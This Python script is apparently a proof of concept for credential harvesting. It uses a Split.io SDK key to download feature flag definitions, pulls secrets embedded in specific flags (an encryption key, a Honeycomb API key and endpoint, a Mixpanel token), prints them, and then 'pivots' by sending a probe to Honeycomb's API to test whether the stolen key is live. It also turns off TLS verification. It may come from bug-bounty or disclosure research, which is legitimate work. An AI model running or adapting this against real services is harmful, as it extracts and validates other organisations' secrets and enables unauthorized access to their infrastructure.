import json
import os
from typing import Any, Dict, List, Optional
import requests
import urllib3

urllib3.disable_warnings()

# Secure configuration fallbacks via environment variables
DEFAULT_SPLIT_KEY = os.getenv("SPLIT_KEY", "YOUR_SPLITIO_SDK_KEY_HERE")
DEFAULT_DATASET = os.getenv("HONEYCOMB_DATASET", "your-dataset-name")


def fetch_split_changes(sdk_key: str) -> List[Dict[str, Any]]:
    """Retrieves feature flag definitions from the Split.io SDK endpoint.

    Args:
        sdk_key: The Split.io SDK authorization key.

    Returns:
        A list of dictionaries representing the raw feature flag definitions.
    """
    url = "https://sdk.split.io/api/splitChanges"
    params = {"since": "-1"}
    headers = {"Authorization": f"Bearer {sdk_key}"}

    try:
        response = requests.get(url, params=params, headers=headers, verify=False, timeout=15)
        if response.status_code == 200:
            return response.json().get("splits", [])
        print(f"[-] Failed to fetch splits. Status Code: {response.status_code}")
    except requests.RequestException as error:
        print(f"[-] Network error during split retrieval: {error}")
    return []


def parse_embedded_config(flag: Dict[str, Any], property_name: str) -> Dict[str, Any]:
    """Safely extracts and decodes a nested JSON string configuration from a flag object.

    Args:
        flag: The specific feature flag dictionary structure.
        property_name: The dictionary key inside 'configurations' holding the JSON string.

    Returns:
        A dictionary containing the safely parsed configuration key-values.
    """
    configurations = flag.get("configurations", {})
    json_payload = configurations.get(property_name, "{}")
    try:
        return json.loads(json_payload)
    except (json.JSONDecodeError, TypeError):
        return {}


def scan_and_extract_secrets(flags: List[Dict[str, Any]]) -> Dict[str, Optional[str]]:
    """Iterates through feature flags to extract third-party secrets and infrastructure details.

    Args:
        flags: A list of feature flag configurations to audit.

    Returns:
        A dictionary containing extracted keys and tokens.
    """
    secrets: Dict[str, Optional[str]] = {
        "encryption_key": None,
        "hc_endpoint": None,
        "hc_key": None,
        "mixpanel_token": None,
    }

    for flag in flags:
        flag_name = flag.get("name")

        if flag_name == "opentelemetry_config":
            config_data = parse_embedded_config(flag, "shared-conf")
            secrets["encryption_key"] = config_data.get("encryptionKey")
            secrets["hc_endpoint"] = config_data.get("hcEndpoint")
            secrets["hc_key"] = config_data.get("hcKey")

            print("[+] Discovered OpenTelemetry Infrastructure Parameters:")
            print(f"    - Encryption Key: {secrets['encryption_key']}")
            print(f"    - Target Endpoint: {secrets['hc_endpoint']}")
            print(f"    - Api Key/Token: {secrets['hc_key']}")

        elif flag_name == "mixpanel_token":
            config_data = parse_embedded_config(flag, "token")
            secrets["mixpanel_token"] = config_data.get("token")

            print("[+] Discovered Mixpanel Analytics Integration:")
            print(f"    - Application Token: {secrets['mixpanel_token']}")

    return secrets


def verify_honeycomb_access(api_key: str, dataset_namespace: str) -> None:
    """Validates the dynamic working state of an extracted Honeycomb API Key.

    Args:
        api_key: The target third-party token to check.
        dataset_namespace: A fallback generic or specific testing namespace.
    """
    print(f"\n[*] Verifying dynamic access token against target workspace: {dataset_namespace}...")
    url = f"https://api.honeycomb.io/1/batch/{dataset_namespace}"
    headers = {"X-Honeycomb-Team": api_key, "Content-Type": "application/json"}
    payload = [{"time": "2026-01-01T00:00:00Z", "data": {"status": "verification_probe"}}]

    try:
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        print(f"[+] Validation Probe Result: HTTP {response.status_code}")
    except requests.RequestException as error:
        print(f"[-] Connection failed during validation step: {error}")


if __name__ == "__main__":
    # Check if the environment setup uses the generic fallback notice
    if "YOUR_" in DEFAULT_SPLIT_KEY or "HERE" in DEFAULT_SPLIT_KEY:
        print("[!] Warning: Using default placeholders. Set environment variables to run tests.")

    # Step 1: Query the primary credential exposure vector
    discovered_flags = fetch_split_changes(DEFAULT_SPLIT_KEY)

    # Step 2: Extract deeper metadata strings inside specific flags
    extracted_tokens = scan_and_extract_secrets(discovered_flags)

    # Step 3: Pivot step to check secondary infrastructure validation safely
    target_token = extracted_tokens.get("hc_key")
    if target_token:
        verify_honeycomb_access(target_token, DEFAULT_DATASET)
    else:
        print("\n[-] Pipeline complete: No active Honeycomb keys extracted to test.")